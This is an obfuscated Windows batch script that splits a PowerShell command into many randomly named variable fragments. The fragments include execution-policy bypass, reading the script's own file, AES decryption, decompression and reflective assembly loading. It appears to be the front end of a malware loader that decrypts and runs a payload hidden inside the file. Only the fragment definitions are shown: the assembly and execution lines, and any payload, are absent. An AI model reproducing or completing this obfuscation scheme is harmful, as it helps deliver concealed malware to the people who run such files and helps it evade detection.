@echo off
set "KPiXPrTzFx=ert]"
set "AXWmfeAJJw=EpZ."
set "SYfxwWeEmO= = N"
set "VMmrrtfSRc=e = "
set "lpPKmKugDD=ion."
set "NMlfvlaYZC=stem"
set "zAFnXtQJZK== [S"
set "CoqGvqodpa=Obje"
set "LJuFWSjKBl=stem"
set "bGxGvuboEY=brea"
set "xBhFHBRWZJ=ode]"
set "YLrMKOtXau=tsWi"
set "qDLCSPsdPv=PMc."
set "rmRRYNGHIW=gbHd"
set "GFcVnQMFZH=Hd);"
set "CebVTkmTCQ=th('"
set "OhvINThwEt=Disp"
set "dqUeJcHGCN=$fgb"
set "IYkwJBTjCS=.IO."
set "wwuDDSLErN=]::("
set "ohmwnuJWPr=CZEp"
set "jcfCkcvpGG=);$R"
set "QKkAajMisQ=TllA"
set "hetRfRDvCw=raph"
set "vZaNObxGHo=z = "
set "ReNdfjeLQz=embl"
set "ukAdAzrErF=oint"
set "bJTsNpYEcy=($sZ"
set "BtaNItyLjz= = ["
set "LGXKMZuIgG=7;$Z"
set "wLAZNpDICU=V = "
set "BKAJsSKLzH=;$GT"
set "NOGULjCjdo=File"
set "nNccULSjAa=dV1k"
set "tHkNiqjbPJ=join"
set "FBDrvyrPeP=ect "
set "zdBqGApZjk=16] "
set "moTrafdSLd=;$GT"
set "hSRyZewsqS=tS46"
set "XaZwWSIzGv=form"
set "evaNdCyymi=ay()"
set "hpJbYNpOIM=Rf.D"
set "dCYihTwWXD== $Z"
set "vNOWBnJuje=ecry"
set "ROzmYMQmYt=ose("
set "mQhFrBflcF=rity"
set "sKPNEWSRQW=saBm"
set "ndpmmFxyRS= New"
set "ECOJZJkXnU=NxTe"
set "uwweQWvPMW=y.Ci"
set "CQmySfDKjG=7kGw"
set "eCfqxMmUCt=..-1"
set "hHgwrCeSvx=hEVz"
set "PnxOpfXcJW=oL'["
set "XbIapOfZfC=[-1."
set "XlgYbQvqAn=Star"
set "XzZDKOhIXN=.-16"
set "XxlkOjRlYI=am;$"
set "jRBHzgOIqq=z, 0"
set "RMBKoMRLYE=)($D"
set "BxMCKiarFB=ispo"
set "cdpsmtuKYz=ring"
set "UgARofPQGc=ress"
set "nnOLRpjWfp=S46e"
set "UtMxlmRjPf=IoO3"
set "DmlBDiWZmz=)))"
set "zXvCJLIlAL=nirt"
set "sFCjLEcuzf=KhdF"
set "miIcmNaFlE=pZ, "
set "OjZDXFiQXh=ress"
set "dodKgdQvZg=hy.A"
set "sowNoKTNtO= [Sy"
set "xbiZRIGxRh=Disp"
set "aIdzLmcqvh=('%~f0'"
set "YgQsjZAJiU=ew-O"
set "MBfdneQuJE=bypa"
set "gjrLPFWInk=();$"
set "eDaastjEXp=DhEV"
set "kxAsyXogMY='gni"
set "LifHnnigeD=$DhE"
set "YQlqgGQgSA=lBlo"
set "fLetPmHbZu=gnir"
set "tTvcnhRQKm=esMa"
set "PdvLQKXqVm=-4] "
set "aYnvLoJtyp=);$Z"
set "itStJRvtPL=::('"
set "AUGNXbEtYs=PMc "
set "GMdyqbLrbb=.Com"
set "gpvFJTrhDZ=ress"
set "zCsOHSgiUp=ypto"
set "RuWreDWTAN=gth)"
set "QoRPJzkbjq='[-1"
set "KosnSwnMdf=.Mod"
set "TECRGZnOvK=F'[-"
set "lVzThUPsJx=pres"
set "czzNoxmpNb=THxh"
set "jxvgzHrPXn=rtS4"
set "eztpgUCPZH=Conv"
set "CHmDkkwAVH=Vz ="
set "AmTBhptHWk=le  "
set "VsGYiGdmHg=ck($"
set "zCZJxRhnBe=iron"
set "smCESFHGow=comp"
set "gQalJHYOCM=[]] "
set "IopzZiJqwg=$GTP"
set "odNIWvQlXN=hEVz"
set "GTsrtqOfcJ=Obje"
set "MskiWZehFe=HO3I"
set "HSAUglfAms=]::N"
set "CRahqEHlOD= = $"
set "kNYpjFRElv=();$"
set "fKIDruqoVE=rofi"
set "gWYsskRYMR=bstr"
set "rLeaIVXuna=yste"
set "GuWVUFTBpH=em.C"
set "CrCkcGbfCl=fore"
set "npAuyPCVrW=:: '"
set "pxTEKScpdW=Syst"
set "YsoDRFRkXu=Comp"
set "qAcPoSxJcz=Secu"
set "BlvyUscYlF=tryP"
set "rucYNZNQnm= [Sy"
set "dhVUUiDhCL=$fgb"
set "llsySClxsA=, (,"
set "SQuDiNrqTJ=] -j"
set "ZEgxQPwknz=New-"
set "FHwLVYSDXZ=6] -"
set "BMudYcvPps=('ev"
set "jLfOfiuvFz=tion"
set "kPZutabIRe=Syst"
set "NguvhhKoQQ=vert"
set "KjErffPVGR=urit"
set "kVysvNiPxA=g = "
set "aSbdyhuHBJ=[Env"
set "pBAoRZgPod=and "
set "tkzBcqjOPO=($sZ"
set "pZOgOPnGtU=);$Z"
set "KqGvAZufzM=;$Cw"
set "IYTOwOEBKu=ct S"
set "NIOURgbcRV=Invo"
set "knEaSvgbLf= '')"
set "ECEMJuDYLy=-joi"
set "mOIrLZlsjt=Bh ="
set "qtdIWCKeWo=rity"
set "amKEmgHeSB='oPV"
set "vdcXCwyYte=..-1"
set "leaVhBeczR=grap"
set "kTofVkIZiZ=New-"
set "kLRVfYeiaX=m(, "
